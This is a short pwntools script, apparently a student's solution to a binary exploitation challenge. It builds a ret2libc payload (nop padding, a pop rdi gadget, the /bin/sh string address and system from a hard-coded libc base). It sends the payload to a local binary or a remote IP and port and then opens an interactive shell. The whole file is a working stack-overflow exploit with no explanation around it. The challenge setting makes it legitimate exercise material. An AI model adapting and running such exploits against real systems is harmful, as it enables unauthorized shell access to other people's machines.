
from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        b *vuln+110
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve():
    p = conn()
    # p = process("./6")
    context.arch = 'amd64'

    # context.log_level = 'debug'
    p.sendlineafter(b"NIM:", b"13523035")
    p.sendlineafter(b"Challenge:", b"7")

    # libc_base = 0x00007ffff7d97000
    libc_base = 0x00007ffff7d90000 # remote
    system = libc_base + 0x50d70
    binsh = libc_base + 0x1d8678
    pop_rdi = 0x40151a
    padding = 56
    ret = 0x40101a

    payload = flat(
        asm('nop') * padding,
        pop_rdi,
        binsh,
        ret,
        system
    )

    with open("payload.bin", "wb") as f:
        f.write(payload)

    # write your payload here
    p.sendline(payload) # meng-inject payload ke dalam binary
    p.interactive() # flush to stdout 

solve()

